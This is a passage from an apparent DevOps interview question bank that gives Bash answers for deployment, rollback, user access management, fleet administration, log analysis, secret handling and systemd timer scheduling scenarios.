  aws elbv2 wait target-deregistered --target-group-arn "$TG" --targets "Id=$id"
  ip=$(aws ec2 describe-instances --instance-ids "$id" --query 'Reservations[0].Instances[0].PrivateIpAddress' --output text)
  ssh -o BatchMode=yes "deploy@$ip" "sudo /opt/deploy/deploy.sh $(printf '%q' "$version")" ||
    { echo "deploy failed on $id, stopping rollout" >&2; exit 1; }
  aws elbv2 register-targets --target-group-arn "$TG" --targets "Id=$id"
  aws elbv2 wait target-in-service --target-group-arn "$TG" --targets "Id=$id" ||
    { echo "$id never became healthy, stopping rollout" >&2; exit 1; }
done
```
1. The built-in `wait` commands poll with sensible timeouts.
2. Stop on the first failure; leave the failed instance out of the target group for investigation.
3. Check capacity first: with 10 instances, losing one at a time must not overload the rest.

**Why →** Draining avoids dropped requests; stopping early limits the blast radius.

**Interview tip →** Mention the target group's deregistration delay (default 300 s) and tuning it for faster rollouts.

</details>

### Q63. After a deploy, the health check fails intermittently. Your script must roll back automatically, but only if the failure persists. How? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** A single failed probe during warm-up should not trigger rollback; sustained failure should.

**What I'd do →**
```bash
ok=0 fail=0
for _ in $(seq 1 30); do
  if curl -fsS -o /dev/null --max-time 3 http://127.0.0.1:8080/readyz; then
    ok=$((ok + 1)); fail=0
    (( ok >= 5 )) && { echo "healthy"; exit 0; }
  else
    fail=$((fail + 1)); ok=0
    (( fail >= 5 )) && break
  fi
  sleep 2
done
rollback "$previous"; exit 1
```
1. Require 5 consecutive successes to pass and 5 consecutive failures to fail, within an overall deadline.

**Why →** Consecutive-count thresholds smooth out warm-up noise while still failing fast on real breakage.

**Interview tip →** Mention this mirrors Kubernetes `successThreshold`/`failureThreshold` and ALB healthy/unhealthy thresholds.

</details>

### Q64. Implement a blue/green switch on a single nginx host with a script. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Two app instances (blue on 8081, green on 8082); nginx points at one through an include file.

**What I'd do →**
```bash
active=$(grep -oE '808[12]' /etc/nginx/conf.d/upstream-active.conf)
target=$([[ $active == 8081 ]] && echo 8082 || echo 8081)
deploy_to_port "$target"
wait_for_http "http://127.0.0.1:$target/readyz" 60 || die "new color unhealthy; live traffic untouched"

tmp=$(mktemp /etc/nginx/conf.d/.upstream.XXXXXX)
printf 'upstream app { server 127.0.0.1:%s; }\n' "$target" > "$tmp"
chmod 0644 "$tmp"
mv -f -- "$tmp" /etc/nginx/conf.d/upstream-active.conf
nginx -t && systemctl reload nginx || { echo "nginx config invalid" >&2; exit 1; }
echo "switched $active -> $target; rollback = rerun with previous color"
```
1. The idle color is deployed and tested before any traffic moves.
2. `nginx reload` swaps workers gracefully; existing connections finish on old workers.

**Why →** Rollback is just pointing back at the old color, which is still running.

**Interview tip →** Mention database migrations: they must be backward compatible so both colors can run against the same schema.

</details>

### Q65. Onboard 30 engineers: create accounts and install their SSH keys from their GitHub usernames, idempotently. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** GitHub publishes public keys at `https://github.com/<user>.keys`. The script must be safe to rerun.

**What I'd do →**
```bash
while IFS=, read -r user gh_user; do
  [[ $user =~ ^[a-z_][a-z0-9_-]{0,31}$ ]] || { echo "skip invalid $user" >&2; continue; }
  id -u "$user" &>/dev/null || useradd --create-home --shell /bin/bash --groups developers "$user"
  install -d -m 0700 -o "$user" -g "$user" "/home/$user/.ssh"
  keys=$(curl -fsS --max-time 10 "https://github.com/${gh_user}.keys") || { echo "no keys for $gh_user" >&2; continue; }
  [[ -n $keys ]] || continue
  tmp=$(mktemp); printf '%s\n' "$keys" > "$tmp"
  install -m 0600 -o "$user" -g "$user" "$tmp" "/home/$user/.ssh/authorized_keys"; rm -f "$tmp"
done < <(tail -n +2 engineers.csv)
```
1. `id -u` check makes `useradd` idempotent; `install` sets owner and mode atomically.
2. Validate usernames before using them in paths.

**Why →** Rerunnable scripts let you fix one bad row and rerun without side effects.

**Interview tip →** Mention that at scale this belongs in config management (Ansible `user` and `authorized_key` modules) or SSO with short-lived certificates.

</details>

### Q66. An engineer leaves the company. Write the offboarding steps for Linux servers. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Revoke access immediately, preserve data for handover, and keep an audit trail.

**What I'd do →**
```bash
user=$1
id "$user" &>/dev/null || die "no such user $user"
usermod --lock --expiredate 1 --shell /usr/sbin/nologin "$user"    # no password, no login
pkill -KILL -u "$user" || true                                      # end sessions and processes
rm -f "/home/$user/.ssh/authorized_keys"
rm -f "/etc/sudoers.d/$user"
crontab -r -u "$user" 2>/dev/null || true
tar -czf "/var/backups/offboard/${user}-$(date +%F).tar.gz" -C /home "$user"
logger -t offboard "offboarded $user by ${SUDO_USER:-root}"
```
1. Lock first, delete later (`userdel -r` after the retention period), so file ownership stays readable.
2. Also revoke central access: IAM, SSO, VPN, Git hosting, CI secrets the person could read.

**Why →** Locking keeps UIDs stable for audit and data handover while removing access instantly.

**Interview tip →** Mention that SSH keys bypass a locked password, which is why removing `authorized_keys` matters.

</details>

### Q67. You are asked to audit a server for risky accounts. What does your script check? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Look for privilege, missing passwords, passwordless sudo and stray keys.

**What I'd do →**
```bash
awk -F: '$3 == 0 && $1 != "root" {print "UID 0 account:", $1}' /etc/passwd
awk -F: '$2 == "" {print "empty password:", $1}' /etc/shadow
grep -rhE '^[^#].*NOPASSWD' /etc/sudoers /etc/sudoers.d/ 2>/dev/null
awk -F: '$3 >= 1000 && $7 !~ /(nologin|false)$/ {print $1}' /etc/passwd | while read -r u; do
  f="/home/$u/.ssh/authorized_keys"; [[ -s $f ]] && echo "$u: $(grep -c . "$f") key(s)"
done
lastlog -b 90 | awk 'NR > 1 && $0 !~ /Never logged in/ {print "inactive 90d+:", $1}'
```

**Why →** These are the usual paths to unauthorized root: extra UID 0 accounts, blank passwords and unrestricted sudo.

**Interview tip →** Mention running audits as code (CIS benchmarks via Lynis or OpenSCAP) rather than only ad-hoc scripts.

</details>

### Q68. You must rotate the SSH key used by automation across 200 servers without locking yourself out. How? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Add before remove, verify before cleanup, and do it in batches.

**What I'd do →**
1. Generate the new key: `ssh-keygen -t ed25519 -f ~/.ssh/automation_2026 -C automation-2026 -N ''`.
2. Phase 1, add: append the new public key on every host (idempotent `grep -qxF || echo >>`), using the **old** key.
3. Phase 2, verify: `ssh -i ~/.ssh/automation_2026 -o BatchMode=yes -o IdentitiesOnly=yes host true` on every host; collect failures and fix them.
4. Switch all automation (CI secrets, Ansible config) to the new key; run for a day.
5. Phase 3, remove: delete the old key line with `sed -i "\|$(cut -d' ' -f2 old.pub)|d" ~/.ssh/authorized_keys` using the new key, again verifying access after.
6. Run each phase with `xargs -P 20` and a log per host.

**Why →** At every point at least one working key exists, so a failure never strands a host.

**Interview tip →** Mention SSH certificates (a CA with short-lived certs) as the long-term fix that removes key rotation work.

</details>

### Q69. Run a command on 200 hosts in parallel and produce a summary of which succeeded and failed. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Bound concurrency, add timeouts, capture per-host output and exit codes.

**What I'd do →**
```bash
out=$(mktemp -d)
run_one() {
  local h=$1
  if timeout 60 ssh -n -o BatchMode=yes -o ConnectTimeout=5 "$h" 'sudo systemctl is-active app' > "$out/$h.log" 2>&1
  then echo "$h OK"; else echo "$h FAIL($?)"; fi
}
export -f run_one; export out
xargs -a hosts.txt -P 20 -I{} bash -c 'run_one "$1"' _ {} | sort > "$out/summary.txt"
grep -c ' OK' "$out/summary.txt"; grep FAIL "$out/summary.txt" || true
```
1. `-P 20` limits parallel SSH sessions; `-n` stops SSH from reading stdin.
2. Pass the host as an argument (`_ {}`), never into the command string.

**Why →** You get a reproducible summary and per-host logs for the failures, without hammering the network.

**Interview tip →** Mention Ansible ad-hoc (`ansible all -m shell -a ... -f 20`) or `pssh` as ready-made alternatives.

</details>

### Q70. Push an updated nginx config to a fleet, but only reload hosts where the file changed and the config validates. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Reloading unchanged hosts is noise; reloading with an invalid config takes the site down.

**What I'd do →**
```bash
for h in "${hosts[@]}"; do
  remote_sum=$(ssh -n "$h" 'sha256sum /etc/nginx/conf.d/app.conf 2>/dev/null | cut -d" " -f1')
  local_sum=$(sha256sum app.conf | cut -d' ' -f1)
  [[ $remote_sum == "$local_sum" ]] && { echo "$h unchanged"; continue; }
  scp -q app.conf "$h:/tmp/app.conf.new"
  ssh -n "$h" 'sudo cp -a /etc/nginx/conf.d/app.conf /etc/nginx/conf.d/app.conf.bak 2>/dev/null;
               sudo install -m 0644 /tmp/app.conf.new /etc/nginx/conf.d/app.conf &&
               sudo nginx -t && sudo systemctl reload nginx ||
               { sudo mv /etc/nginx/conf.d/app.conf.bak /etc/nginx/conf.d/app.conf; exit 1; }' ||
    { echo "$h FAILED, restored previous config" >&2; exit 1; }
done
```

**Why →** Checksums make the operation idempotent; validation plus restore makes it safe.

**Interview tip →** Mention that this is what Ansible's `template` + `validate:` + handler `notify` gives you for free.

</details>

### Q71. In CI, after building image `api:1.4.2`, a script must update the tag in a GitOps repo and open a PR. How? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Edit YAML structurally, commit on a branch, push, and open a PR with the CLI.

**What I'd do →**
```bash
export NEW_TAG=1.4.2
git clone --depth 1 "https://x-access-token:${GH_TOKEN}@github.com/acme/gitops.git" && cd gitops
git switch -c "bump-api-$NEW_TAG"
yq -i '.image.tag = strenv(NEW_TAG)' apps/api/values-prod.yaml
git diff --quiet && { echo "already at $NEW_TAG"; exit 0; }
git -c user.name=ci-bot -c user.email=ci@acme.dev commit -am "api: bump image to $NEW_TAG"
git push -u origin HEAD
gh pr create --title "api: $NEW_TAG to prod" --body "Automated bump from build $GITHUB_RUN_ID" --base main
```
1. `yq` with `strenv` keeps formatting and avoids quoting bugs.
2. `git diff --quiet` makes reruns harmless.

**Why →** GitOps requires the change to land through Git with review, not via `kubectl set image`.

**Interview tip →** Mention that tools like Argo CD Image Updater or Renovate can do this automatically.

</details>

### Q72. A deploy script runs `kubectl apply` and must fail the pipeline, and roll back, if the rollout does not complete. Write it. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** `kubectl apply` returns success as soon as the API accepts the object, not when pods are healthy.

**What I'd do →**
```bash
kubectl apply -f k8s/
if ! kubectl rollout status deployment/api -n prod --timeout=180s; then
  echo "rollout failed, undoing" >&2
  kubectl rollout undo deployment/api -n prod
  kubectl rollout status deployment/api -n prod --timeout=180s || true
  exit 1
fi
```
1. `rollout status` waits for the new ReplicaSet to be fully available and exits non-zero on timeout or progress deadline.
2. Set `progressDeadlineSeconds` in the Deployment so Kubernetes itself marks a stuck rollout as failed.

**Why →** Without waiting, CI goes green while pods crash-loop.

**Interview tip →** Mention that with GitOps, rollback means reverting the Git commit, not `rollout undo`.

</details>

### Q73. Three app servers run the same deploy script, and each tries to run database migrations at the same time. How do you ensure only one does? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** `flock` only works on one host. You need a lock that all hosts share.

**What I'd do →**
1. Use the database itself as the lock: Postgres advisory locks are held for the session.
   ```bash
   psql -v ON_ERROR_STOP=1 <<'SQL'
   SELECT pg_advisory_lock(424242);
   \! ./migrate up
   SELECT pg_advisory_unlock(424242);
   SQL
   ```
   Most migration tools (Flyway, Liquibase, Alembic with care, golang-migrate) already take such a lock.
2. Or run migrations once, as a separate pipeline step or a Kubernetes Job, before rolling out app servers.
3. Alternatives: a DynamoDB conditional write, Consul or etcd locks.

**Why →** Concurrent migrations can apply a change twice or interleave DDL, corrupting the schema.

**Interview tip →** The cleanest answer is "migrations are a separate, single step in the pipeline". Locks are a fallback.

</details>

### Q74. During a deploy you show a maintenance page. If the deploy fails, the page stayed up last time. Fix the script. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** The removal step was at the end of the happy path, so any failure skipped it.

**What I'd do →**
```bash
maintenance_on()  { touch /srv/app/shared/maintenance.flag; }
maintenance_off() { rm -f /srv/app/shared/maintenance.flag; }

maintenance_on
trap maintenance_off EXIT
run_migrations
switch_release
```
1. nginx serves the page when the flag exists: `if (-f /srv/app/shared/maintenance.flag) { return 503; }` with an `error_page 503`.
2. The `EXIT` trap removes it on success, failure, or Ctrl+C.

**Why →** Traps make cleanup independent of which line failed.

**Interview tip →** Mention that a 503 with a `Retry-After` header is better for clients and SEO than a 200 maintenance page.

</details>

### Q75. A CI pipeline deploys to servers over SSH. The first run fails with `Host key verification failed.` A teammate suggests `StrictHostKeyChecking=no`. What do you do? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The runner has no `known_hosts` entry. Disabling checking removes protection against man-in-the-middle attacks on your deploy path.

**What I'd do →**
1. Store the servers' host keys as a CI variable (collected once from a trusted source, for example the instance's console output or your config management), and write them in the job:
   ```bash
   install -d -m 0700 ~/.ssh
   printf '%s\n' "$KNOWN_HOSTS" > ~/.ssh/known_hosts
   chmod 0644 ~/.ssh/known_hosts
   ```
2. Load the deploy key from a secret with `ssh-agent`, never write it with loose permissions.
3. Use `-o BatchMode=yes` so failures are immediate.
4. For dynamic fleets, use SSH host certificates signed by your CA, and `@cert-authority` in `known_hosts`.

**Why →** Host key checking is the only thing proving you are talking to your server and not an attacker.

**Interview tip →** Refusing `StrictHostKeyChecking=no` politely, with an alternative, is the answer interviewers want.

</details>

### Q76. A contractor needs sudo on one server for two hours. How do you grant it so it expires automatically? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Manual revocation gets forgotten. Make expiry part of the grant.

**What I'd do →**
1. Write a validated sudoers drop-in:
   ```bash
   f=/etc/sudoers.d/90-tmp-contractor
   tmp=$(mktemp)
   echo 'contractor ALL=(ALL) /usr/bin/systemctl restart app, /usr/bin/journalctl' > "$tmp"
   visudo -cf "$tmp" && install -m 0440 "$tmp" "$f"; rm -f "$tmp"
   ```
2. Schedule removal with a transient systemd timer: `systemd-run --on-active=2h --unit=revoke-contractor rm -f "$f"` (or `at now + 2 hours`).
3. Scope commands narrowly; avoid `ALL` and anything that can spawn a shell (`vi`, `less`, `find -exec`).
4. Log the grant and the revocation with `logger`.

**Why →** `visudo -c` prevents a syntax error from breaking sudo for everyone; timed removal prevents forgotten access.

**Interview tip →** Mention just-in-time access tools (Teleport, AWS SSM with IAM conditions) as the scalable version.

</details>

### Q77. Report which servers in a fleet have a different version of `openssl` installed than the approved one. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Collect versions in parallel, compare to the baseline, report drift.

**What I'd do →**
```bash
approved="3.0.13-0ubuntu3.4"
ver() {
  local v
  v=$(ssh -n -o BatchMode=yes -o ConnectTimeout=5 "$1" "dpkg-query -W -f='\${Version}' openssl" 2>/dev/null) || v=unreachable
  echo "$1 ${v:-missing}"
}
export -f ver
xargs -a hosts.txt -P 20 -I{} bash -c 'ver "$1"' _ {} |
  awk -v a="$approved" '$2 != a {print "DRIFT", $0}' | sort
```
1. `dpkg-query -W -f='${Version}'` gives a clean version string (`rpm -q --qf '%{VERSION}-%{RELEASE}'` on RHEL). The `\$` and inner single quotes keep `${Version}` from being expanded by either the local or the remote shell.
2. Unreachable hosts appear as drift so they are not silently skipped.

**Why →** Version drift is how one unpatched server survives a CVE rollout.

**Interview tip →** Mention AWS SSM Inventory or osquery for continuous fleet inventory.

</details>

### Q78. An EC2 instance's user-data Bash script sometimes fails half-way, and you cannot see why. How do you debug and harden it? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** User data runs once at first boot via cloud-init, as root, with no terminal.

**What I'd do →**
1. Read the logs: `/var/log/cloud-init-output.log` (script output) and `/var/log/cloud-init.log`; the script itself is at `/var/lib/cloud/instance/scripts/part-001`.
2. Add `#!/bin/bash`, `set -Eeuxo pipefail`, and an `ERR` trap that logs the line.
3. Wait for network and package locks: retry `apt-get update` with backoff; `cloud-init status --wait` in dependent steps.
4. Make steps idempotent so `cloud-init clean && reboot` (or rerunning the script) is safe.
5. Signal completion or failure (for example `cfn-signal`, an ASG lifecycle hook, or a tag), so failures are visible.

**Why →** First-boot scripts fail on timing (network not ready, apt locks), and without logs and signals nobody notices.

**Interview tip →** Mention baking images with Packer to move most of user data out of boot time.

</details>

### Q79. After patching, services must be restarted in order: database, then API, then web, each healthy before the next. Script it. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Ordered restart with a health gate per step, stopping on the first failure.

**What I'd do →**
```bash
declare -A check=(
  [postgresql]='pg_isready -q'
  [api]='curl -fsS -o /dev/null --max-time 3 http://127.0.0.1:8080/readyz'
  [nginx]='curl -fsS -o /dev/null --max-time 3 http://127.0.0.1/'
)
for svc in postgresql api nginx; do
  systemctl restart "$svc"
  for _ in {1..30}; do bash -c "${check[$svc]}" && continue 2; sleep 2; done
  echo "$svc not healthy after restart, stopping" >&2; exit 1
done
echo "all services healthy"
```
1. `continue 2` jumps to the next service once its check passes.
2. The array keeps order explicit (associative arrays do not preserve it; the `for` list does).

**Why →** Restarting dependents before their dependency is healthy just creates a second wave of errors.

**Interview tip →** Mention systemd `After=`/`Requires=` for boot ordering, and that health gating still needs a check like this.

</details>

### Q80. You deploy to one canary host first and want to proceed only if its error rate is not worse than the rest. How do you script the decision? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Compare canary and baseline error rates over comparable recent traffic, with a minimum request count to avoid noise.

**What I'd do →**
```bash
rate() {  # rate HOST -> "errors total" for the most recent 5,000 requests
  ssh -n "$1" "tail -n 5000 /var/log/nginx/access.log" |
    awk '{t++; if ($9 ~ /^5/) e++} END {print e+0, t+0}'
}
read -r ce ct < <(rate "$canary")
be=0 bt=0; for h in "${baseline[@]}"; do read -r e t < <(rate "$h"); be=$((be + e)); bt=$((bt + t)); done
(( ct >= 500 )) || die "canary has only $ct requests; not enough data"
awk -v ce="$ce" -v ct="$ct" -v be="$be" -v bt="$bt" \
  'BEGIN {c = ce / ct; b = (bt ? be / bt : 0); printf "canary %.3f%% baseline %.3f%%\n", 100*c, 100*b
          exit !(c <= b * 1.5 + 0.001)}' || { rollback "$canary"; exit 1; }
echo "canary healthy, continuing rollout"
```

**Why →** Relative comparison handles normal background errors; a minimum sample avoids judging on 10 requests.

**Interview tip →** Mention that Argo Rollouts or Flagger automate this with Prometheus queries, and that latency matters as much as errors.

</details>

---

## Scenarios: text processing and scheduling decisions

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q81. Users report errors in the last hour. From the Nginx access log, find which endpoints produce the most 5xx responses. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Filter by time and status, strip query strings, count per path.

**What I'd do →**
```bash
since=$(date -d '1 hour ago' '+%d/%b/%Y:%H')
awk -v s="$since" '$4 >= "["s && $9 ~ /^5/ {split($7, p, "?"); print $9, p[1]}' /var/log/nginx/access.log |
  sort | uniq -c | sort -rn | head -n 15
```
1. Field 9 is the status, field 7 the request path in the combined format.
2. Dropping the query string groups `/api/orders?id=1` and `?id=2` together.
3. The string comparison on `$4` works within a single day; for windows across midnight, use epoch conversion or `journalctl --since` if logs go to the journal.

**Why →** Grouping by endpoint turns 50,000 error lines into "it is `/api/checkout`".

**Interview tip →** Mention checking `$upstream_status` or upstream response time fields too, to separate nginx errors from backend errors.

</details>

### Q82. A MySQL slow log is 3 GB. You need the 10 slowest query patterns. What do you do? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Raw greps show individual queries; you want patterns (normalized queries) with total and max time.

**What I'd do →**
1. Use the right tool first: `pt-query-digest /var/log/mysql/slow.log > report.txt` (Percona Toolkit) or `mysqldumpslow -s t -t 10 slow.log`.
2. If neither is installed, extract `Query_time` with awk:
   ```bash
   awk '/^# Query_time:/ {t = $3; next}
        /^(SELECT|UPDATE|DELETE|INSERT)/ {q = $0; gsub(/[0-9]+/, "N", q); gsub(/'"'"'[^'"'"']*'"'"'/, "S", q)
                                          sum[q] += t; n[q]++; if (t > max[q]) max[q] = t}
        END {for (q in sum) printf "%.1f\t%d\t%.2f\t%s\n", sum[q], n[q], max[q], substr(q, 1, 120)}' slow.log |
     sort -rn | head
   ```
3. Run it on a copy or with `nice`, not on a busy database host's disk.

**Why →** Normalizing literals groups thousands of executions of the same query, which is what you optimize.

**Interview tip →** Lead with `pt-query-digest`; reaching for the right tool beats clever awk.

</details>

### Q83. Two servers that should be identical behave differently. Compare their installed packages. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Generate normalized package lists from both and diff them.

**What I'd do →**
```bash
pkgs() { ssh -n "$1" "dpkg-query -W -f='\${Package} \${Version}\n'" | sort; }
diff <(pkgs web1) <(pkgs web2)
# names only, regardless of version
comm -3 <(pkgs web1 | cut -d' ' -f1) <(pkgs web2 | cut -d' ' -f1)
```
1. On RHEL: `rpm -qa --qf '%{NAME} %{VERSION}-%{RELEASE}\n' | sort`.
2. Extend to configs: `diff <(ssh web1 cat /etc/sysctl.conf) <(ssh web2 cat /etc/sysctl.conf)`.

**Why →** Process substitution makes remote comparisons one-liners without temp files.

**Interview tip →** Mention that drift like this is the argument for immutable images or config management.

</details>

### Q84. Find which pods were OOMKilled in a namespace, with their container names and restart counts. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The last termination reason is in each container's status.

**What I'd do →**
```bash
kubectl get pods -n prod -o json | jq -r '
  .items[] | .metadata.name as $pod
  | .status.containerStatuses[]?
  | select(.lastState.terminated.reason == "OOMKilled")
  | [$pod, .name, .restartCount, .lastState.terminated.finishedAt] | @tsv' | column -t
```
1. `as $pod` keeps the pod name while iterating containers.
2. `[]?` skips pods without container statuses (pending).
3. Compare with limits: `kubectl get pod POD -o jsonpath='{.spec.containers[*].resources.limits.memory}'`.

**Why →** OOM kills hide behind generic `CrashLoopBackOff`; this lists them directly.

**Interview tip →** Mention that `kubectl get events --field-selector reason=OOMKilling` shows node-level OOMs, which are different from container limit kills.

</details>

### Q85. Produce a CSV of running EC2 instances that are missing an `Owner` tag. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Tags are an array of Key/Value pairs; test for the absence of one key.

**What I'd do →**
```bash
echo "region,instance_id,name,type,launch_time" > untagged.csv
for r in $(aws ec2 describe-regions --query 'Regions[].RegionName' --output text); do
  aws ec2 describe-instances --region "$r" --filters Name=instance-state-name,Values=running --output json |
  jq -r --arg r "$r" '.Reservations[].Instances[]
    | select([.Tags[]? | .Key] | index("Owner") | not)
    | [$r, .InstanceId, ((.Tags // []) | from_entries | .Name // ""), .InstanceType, .LaunchTime] | @csv' >> untagged.csv
done
```
1. `from_entries` turns the Key/Value tag list into an object.
2. `@csv` quotes fields correctly.

**Why →** Untagged resources have no owner to ask before cost cleanup or incident response.

**Interview tip →** Mention enforcing tags at creation with AWS Organizations tag policies or SCPs, rather than only reporting.

</details>

### Q86. You have access logs from five web servers and need one timeline sorted by time. How? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Each file is already sorted, so merge rather than re-sort, and tag lines with their source.

**What I'd do →**
1. If logs use ISO 8601 timestamps at line start, a merge sort is enough:
   ```bash
   for h in web{1..5}; do ssh -n "$h" 'cat /var/log/app/app.log' | sed "s/^/$h /" > "/tmp/$h.log"; done
   sort -m -k2,2 /tmp/web*.log > timeline.log
   ```
2. For Nginx's `[09/Nov/2026:14:23:01 +0000]` format, convert to a sortable key first (epoch via gawk `mktime`), then sort numerically.
3. Make sure clocks were synchronized, or the merged timeline lies.

**Why →** `sort -m` is linear on pre-sorted input; ISO timestamps sort correctly as strings.

**Interview tip →** Say this is the argument for ISO 8601 UTC timestamps everywhere and for central logging.

</details>

### Q87. A vendor needs application logs, but they contain emails and card numbers. Mask them first. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Redact with regexes, verify nothing remains, and share only what is needed.

**What I'd do →**
```bash
sed -E \
  -e 's/[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}/<email>/g' \
  -e 's/\b[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{1,4}\b/<card>/g' \
  -e 's/(Authorization: Bearer )[A-Za-z0-9._-]+/\1<token>/g' \
  app.log > app.redacted.log
grep -cE '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}' app.redacted.log   # expect 0
```
1. Verify with a second pass that searches for the patterns again.
2. Reduce scope first (time window, relevant request IDs) so less data leaves.

**Why →** Logs are a frequent source of PII and secrets leaks; regex redaction plus verification is the minimum.

**Interview tip →** Mention fixing the root cause: applications should not log card numbers at all (PCI DSS).

</details>

### Q88. Convert a `.env` file into a Kubernetes Secret manifest without committing plaintext. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** `kubectl` can build the manifest; encryption must happen before it reaches Git.

**What I'd do →**
```bash
kubectl create secret generic api-env --from-env-file=.env -n prod --dry-run=client -o yaml > secret.yaml
kubeseal --format yaml < secret.yaml > sealed-secret.yaml && rm -f secret.yaml   # Sealed Secrets
# or: sops --encrypt --in-place secret.yaml
```
1. `--from-env-file` handles `KEY=value` lines and base64-encodes values.
2. Commit only the sealed or SOPS-encrypted file.

**Why →** Kubernetes Secrets are only base64, not encryption; committing them is committing plaintext.

**Interview tip →** Mention External Secrets Operator as the alternative that keeps secrets in AWS Secrets Manager or Vault.

</details>

### Q89. From JSON Lines application logs, count unique users per day. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Extract (date, user) pairs, de-duplicate, count per date.

**What I'd do →**
```bash
jq -r 'select(.user_id != null) | "\(.ts[0:10]) \(.user_id)"' app-*.jsonl |
  sort -u | awk '{n[$1]++} END {for (d in n) print d, n[d]}' | sort
```
1. `.ts[0:10]` slices the date from an ISO timestamp.
2. `sort -u` removes duplicate (date, user) pairs; awk counts per day.
3. For huge files, `LC_ALL=C sort -u -S 1G --parallel=4`.

**Why →** De-duplicating pairs before counting is the shell equivalent of `COUNT(DISTINCT user_id) GROUP BY day`.

**Interview tip →** Mention handling lines that are not JSON with `jq -R 'fromjson? | ...'`.

</details>

### Q90. Find configuration differences between the staging and prod Helm values files. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Textual diffs are noisy because of key order and formatting; normalize first.

**What I'd do →**
```bash
diff <(yq -P 'sort_keys(..)' values-staging.yaml) <(yq -P 'sort_keys(..)' values-prod.yaml)

# flat path=value view, easy to read and grep
flat() { yq -o=json '.' "$1" | jq -r 'paths(scalars) as $p | "\($p | map(tostring) | join("."))=\(getpath($p))"' | sort; }
diff <(flat values-staging.yaml) <(flat values-prod.yaml)
```
1. `sort_keys(..)` sorts keys recursively, so order does not matter.
2. The flattened form shows exactly which path differs (`resources.limits.memory=512Mi`).

**Why →** Normalized diffs show real configuration drift between environments.

**Interview tip →** Mention `helm diff upgrade` for comparing rendered manifests against what is deployed.

</details>

### Q91. You are adding a new scheduled job on Ubuntu 24.04 servers. Cron or a systemd timer? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Both work; timers give more operational features on systemd hosts.

**What I'd do →**
1. Choose a systemd timer by default: logs in the journal, `systemctl list-timers` for next/last run, `Persistent=true` for missed runs, no overlapping runs, `RandomizedDelaySec=`, sandboxing, `OnFailure=` alerting.
2. Choose cron when the job must be portable to non-systemd systems or containers, or the team manages crontabs centrally and the job is trivial.
3. Either way: absolute paths, locking, timeouts, and logs.

**Why →** Timers solve most of the classic cron pain (environment surprises, silent failures, overlaps) out of the box.

**Interview tip →** Name three concrete timer advantages; "it's newer" is not an answer.

</details>

### Q92. A job must run every 10 minutes, only on weekdays, between 09:00 and 18:00 IST, while servers run in UTC. Write the schedule. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Express the time zone explicitly so it does not depend on the host setting.

**What I'd do →**
```ini
# systemd timer
[Timer]
OnCalendar=Mon..Fri *-*-* 09..17:00/10:00 Asia/Kolkata
```
```text
# cronie (supports CRON_TZ)
CRON_TZ=Asia/Kolkata
*/10 9-17 * * 1-5 /opt/jobs/sync.sh
```
1. `09..17` with every 10 minutes ends at 17:50; add `18:00` separately if the last run must be at 18:00.
2. Verify: `systemd-analyze calendar --iterations=5 'Mon..Fri *-*-* 09..17:00/10:00 Asia/Kolkata'`.

**Why →** Explicit time zones remove ambiguity, and validating the expression avoids surprises.

**Interview tip →** Mention that Debian's Vixie cron ignores `CRON_TZ`, so test which cron you have.

</details>

### Q93. You must migrate 40 crontab entries from a legacy server to systemd timers. How do you do it safely? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Each job has implicit behaviour (environment, user, output mailing) that must be preserved or replaced deliberately.

**What I'd do →**
1. Inventory: `crontab -l -u` for every user, `/etc/crontab`, `/etc/cron.d/*`, `/etc/cron.*/`; record schedule, user, command, environment lines (`PATH`, `MAILTO`, `SHELL`).
2. For each job, create `job.service` (`Type=oneshot`, `User=`, `Environment=` or `EnvironmentFile=`, `WorkingDirectory=`) and `job.timer` with an equivalent `OnCalendar=`, verified with `systemd-analyze calendar`.
3. Replace `MAILTO` with `OnFailure=` alerting; drop `flock` wrappers (timers do not overlap), keep `timeout` behaviour via `TimeoutStartSec=`.
4. Generate units with a script or Ansible template from the inventory, not by hand.
5. Cut over in batches: enable the timer, comment the cron line in the same change, compare a few runs (`journalctl -u job`) with previous behaviour.
6. Keep the old crontab backed up for rollback.

**Why →** Most migration bugs come from environment differences and lost failure emails.

**Interview tip →** Mention testing each service with `systemctl start job.service` before enabling its timer.

</details>

